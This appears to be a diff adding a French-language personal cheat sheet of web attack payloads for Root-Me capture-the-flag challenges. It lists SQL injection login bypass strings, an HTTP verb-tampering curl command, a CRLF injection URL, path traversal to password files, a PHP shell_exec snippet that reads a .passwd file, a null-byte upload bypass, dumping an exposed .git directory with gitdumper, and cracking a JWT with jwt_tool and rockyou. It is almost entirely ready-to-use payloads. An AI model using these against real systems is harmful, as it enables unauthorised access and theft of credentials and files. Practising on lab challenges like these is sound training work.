@@ -1,0 +1,70 @@
+test 0 sécurité. 
+
+username : admin' --
+password : admin' --
+
+username : admin'/*
+password : admin'/*
+
+username : admin' or '1'='1
+password : admin' or '1'='1
+
+username : admin' or '1'='1'--
+password : admin' or '1'='1'--
+
+username : admin' or '1'='1'#
+password : admin' or '1'='1'#
+
+username : admin' or '1'='1'/*
+password : admin' or '1'='1'/*
+===============================================
+
+SQLMAP : 
+
+===============================================
+HTTP : 
+verb tempering : curl -X PUT http://lechall.fr
+                 use burp BITE methode for bypass to. 
+                 
+Cookie : Cookie=admin
+
+CRLF : http://challenge01.root-me.org//web-serveur/ch14/index.php?username=admin%20authenticated.%0D%0AMeyo&password=n'importe-quoi
+
+Directory indexing : ../../../etc/.passsword
+
+===============================================
+
+PHP : 
+
+file mime : Content-Type: image/jpeg
+
+lfi : 
+
+code injection pour voir .password : 
+<?php
+		$output = shell_exec('cat ../../../.passwd');
+		echo "<pre>$output</pre>";
+	?>
+  
+ file null : Upload: null.php%00.jpeg
+             Type: image/jpeg
+
+Code rce : 
+
+=============================================
+Git : https://github.com/internetwache/GitTools
+./gitdumper.sh http://challenge01.root-me.org/web-serveur/ch61/.git/ ./output/
+git status pour savoir les fichiers supprimés
+git checkout -- .  pour savoir les fichiers restauré 
+git log p pour voir les log du git
+
+=============================================
+JSON 
+https://github.com/ticarpi/jwt_tool.git
+exemple d'utilisation : jwt_tool eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw /usr/share/wordlists/rockyou.txt
+============================================
+
+
+
+
+
